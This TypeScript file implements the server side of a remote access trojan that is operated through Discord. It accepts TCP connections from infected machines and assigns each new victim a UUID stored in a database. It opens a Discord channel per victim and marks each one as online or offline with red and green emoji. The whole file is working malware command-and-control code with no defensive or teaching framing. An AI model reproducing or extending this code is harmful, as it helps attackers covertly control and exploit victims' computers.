import {createServer, Server, Socket} from 'net';
import CustomClient from './CustomClient';
import ITCPServer from "../interfaces/IRATServer";
import RATClient from './RATClient';
import { ChannelType, TextChannel } from 'discord.js';

export default class RATServer implements ITCPServer {
    client: CustomClient;
    host: string;
    port: number;
    ratClients: RATClient[];
    server: Server;
    started: boolean = false;
    
    constructor(client: CustomClient) {
        this.client = client;
        this.ratClients = new Array<RATClient>();
        this.host = client.config.tcpHost;
        this.port = client.config.tcpPort;
        this.server = createServer();
    }
    
    start(): void {
        this.server.listen(this.port, this.host, () => {
            this.started = true;
            console.log(`RAT TCP server started on ${this.host}:${this.port}`);
        });
        this.server.on('connection', async (socket: Socket) => {
            // create client object and adds it to the clients array
            let client = new RATClient(socket, this, '');
            this.ratClients.push(client);

            let data = await client.receive();
            // if first time client connects, create a new user
            if (data == 0) {
                const user = await this.client.database.user.create({
                    data: {
                        channelId: null
                    }
                });
                client.send(user.uuid);
                // Create a channel in a category using category ID
                const guild = this.client.guilds.cache.get(this.client.config.guildId) || null;
                if (!guild) {
                    console.log(`Guild with ID ${this.client.config.guildId} not found`);
                    return;
                }
                const channel = await guild.channels.create({
                    name: `🔴${user.uuid}`,
                    type: ChannelType.GuildText,
                    parent: this.client.config.categoryId
                });
                // set the user's channel ID
                await this.client.database.user.update({
                    where: {
                        uuid: user.uuid
                    },
                    data: {
                        channelId: channel.id
                    }
                });
                client.disconnect();
                return;
            }
            let dataString = data as string;
            
            if (dataString.split(';')[0] !== '1') {
                console.log('Invalid data received');
                client.disconnect();
                return;
            }
            
            const uuid = dataString.split(';')[1];
            client.uuid = uuid;
            const user = await this.client.database.user.findUnique({
                where: {
                    uuid: uuid
                }
            });
            if (!user) {
                console.log(`User with UUID ${uuid} not found`);
                client.disconnect();
                return;
            }

            // change the user's connected status to true
            await this.client.database.user.update({
                where: {
                    uuid: uuid
                },
                data: {
                    connected: true
                }
            });
            
            // change the channel name to green
            //@ts-ignore
            let channel = this.client.channels.cache.get(user.channelId) as TextChannel;
            if (!channel) {
                //@ts-ignore
                channel = await this.client.channels.fetch(user.channelId) as TextChannel;
                if (!channel) {
                    return;
                }               
            }
            await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
        });
    }
    
    stop(): void {
        console.log(`Server stopped on ${this.host}:${this.port}`);
    }

    isListening(): boolean {
        return this.started;
    }

    async removeClient(client: RATClient): Promise<void> {
        this.ratClients = this.ratClients.filter((c) => c !==client);
        if (client.uuid === '') {
            return;
        }
        // Search client in database with uuid and set connected status to false
        await this.client.database.user.update({
            where: {
                uuid: client.uuid
            },
            data: {
                connected: false
            }
        });
        const user = await this.client.database.user.findUnique({
            where: {
                uuid: client.uuid
            }
        })
        if (!user) {
            console.log(`User with UUID ${client.uuid} not found`);
            return;
        }
        //@ts-ignore
        let channel = this.client.channels.cache.get(user.channelId) as TextChannel;
        if (!channel) {
            console.log(`Channel with ID ${user.channelId} not found - Deletion`);
            return;
        }
        await channel.setName(`🔴${channel.name.substring(2, channel.name.length)}`);
    }
}